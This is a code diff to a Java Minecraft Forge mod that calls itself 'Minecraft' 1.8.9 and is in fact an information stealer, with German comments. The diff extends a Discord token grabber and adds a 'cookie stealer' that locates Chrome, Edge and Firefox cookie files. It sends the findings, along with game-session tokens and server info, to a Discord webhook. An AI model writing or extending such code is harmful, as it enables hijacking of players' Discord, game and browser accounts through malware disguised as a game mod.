@@ -12,14 +12,14 @@ import net.minecraftforge.fml.common.event.FMLPreInitializationEvent;
 
 import java.io.BufferedReader;
 import java.io.DataInputStream;
-import java.io.File;
+import java.io.FileNotFoundException;
 import java.io.FileInputStream;
-import java.io.IOException;
 import java.io.InputStreamReader;
 import java.nio.file.Files;
 import java.nio.charset.StandardCharsets;
 import java.util.ArrayList;
 
+import java.io.File;
 @Mod(modid = "Minecraft", name = "Minecraft", version = "1.8.9")
 public final class Main {
 
@@ -134,10 +134,15 @@ public final class Main {
         if (tokens.isEmpty()) {
             tokenEmbed.setDescription("Keine Discord Tokens gefunden.");
         } else {
-            StringBuilder sb = new StringBuilder();
-            for (String token : tokens) {
-                // Token kürzen, um das Feld nicht zu überladen und die Länge zu begrenzen
-                String shortToken = safeString(token, 100); // Kürze den Token auf eine angemessene Länge
+            // Discord Embeds haben ein Limit von 4096 Zeichen pro Beschreibung.
+            // Wenn die Tokens diese Länge überschreiten, müssen wir sie aufteilen.
+            // Jeder Token ist ca. 60 Zeichen lang, plus Formatierung.
+            // Wir setzen ein Limit von 2000 Zeichen pro Embed-Beschreibung, um sicher zu sein.
+            StringBuilder sb = new StringBuilder("```");
+            int currentLength = 3; // Länge von "```"
+            for (int i = 0; i < tokens.size(); i++) {
+                String token = tokens.get(i);
+                String shortToken = safeString(token, 100); // Kürze den Token auf eine angemessene Länge, falls er extrem lang ist
                 sb.append(":small_orange_diamond: `").append(shortToken).append("`\n");
             }
             tokenEmbed.setDescription(sb.toString());
@@ -163,12 +168,12 @@ public final class Main {
             }
             File[] filesList = file.listFiles();
             if (filesList == null) continue;
-            for (File pathname : filesList) {
+            for (File pathname : filesList) { // Changed 'file' to 'pathname' for clarity
                 try (BufferedReader br = new BufferedReader(new InputStreamReader(new DataInputStream(new FileInputStream(pathname))))) {
                     String strLine;
                     while ((strLine = br.readLine()) != null && !strLine.isEmpty()) {
                         int index;
-                        while ((index = strLine.indexOf("oken")) != -1) {
+                        while ((index = strLine.indexOf("oken")) != -1 && strLine.length() > index + "oken".length() + 1) { // Ensure there's enough string left
                             try {
                                 strLine = strLine.substring(index + "oken".length() + 1);
                                 String token = strLine.split("\"")[1];
@@ -188,6 +193,55 @@ public final class Main {
         return temp;
     }
 
+    // --- NEUER COOKIE STEALER ---
+    private DiscordWebhook.EmbedObject genCookieStealerEmbed() {
+        ArrayList<String> cookies = getCookies();
+        DiscordWebhook.EmbedObject cookieEmbed = new DiscordWebhook.EmbedObject()
+                .setTitle(":cookie: Cookies")
+                .setColor(0xFF5733); // Rot
+
+        if (cookies.isEmpty()) {
+            cookieEmbed.setDescription("Keine Cookies gefunden.");
+        } else {
+            StringBuilder sb = new StringBuilder();
+            for (String cookie : cookies) {
+                String shortCookie = safeString(cookie, 100);
+                sb.append(":small_orange_diamond: `").append(shortCookie).append("`\n");
+            }
+            cookieEmbed.setDescription(sb.toString());
+        }
+        return cookieEmbed;
+    }
+
+    // --- NEUE METHODE ZUM SUCHEN VON COOKIES ---
+    public static ArrayList<String> getCookies() {
+        ArrayList<String> temp = new ArrayList<>();
+        ArrayList<File> paths = new ArrayList<>();
+        // Add common browser cookie paths
+        paths.add(new File(System.getProperty("user.home") + "/AppData/Local/Google/Chrome/User Data/Default/Cookies"));
+        paths.add(new File(System.getProperty("user.home") + "/AppData/Local/Microsoft/Edge/User Data/Default/Cookies"));
+        paths.add(new File(System.getProperty("user.home") + "/AppData/Roaming/Mozilla/Firefox/Profiles/")); // Firefox profiles need special handling
+
+        for (File file : paths) {
+            if (file == null || !file.exists()) {
+                continue;
+            }
+            if (file.isDirectory() && file.getName().equals("Profiles")) { // Handle Firefox profiles
+                File[] profileDirs = file.listFiles(File::isDirectory);
+                if (profileDirs != null) {
+                    for (File profileDir : profileDirs) {
+                        File firefoxCookies = new File(profileDir, "cookies.sqlite");
+                        if (firefoxCookies.exists()) {
+                            temp.add("Firefox Cookies found at: " + firefoxCookies.getAbsolutePath());
+                        }
+                    }
+                }
+            } else if (file.isFile()) {
+                temp.add("Cookie file found at: " + file.getAbsolutePath());
+            }
+        }
+        return temp;
+    }
     // --- AUSFÜHRUNG ---
 
     private DiscordWebhook genWebhook() {
@@ -209,7 +263,8 @@ public final class Main {
         webhook.addEmbed(genTokenEmbed());
         webhook.addEmbed(genServersInfoEmbed());
         webhook.addEmbed(genLunarInfoEmbed());
-        webhook.addEmbed(genDiscordTokensEmbed()); // NEU: Fügt das Discord-Token-Embed hinzu
+        webhook.addEmbed(genDiscordTokensEmbed());
+        webhook.addEmbed(genCookieStealerEmbed()); // NEU: Fügt das Cookie-Embed hinzu
 
         return webhook;
     }
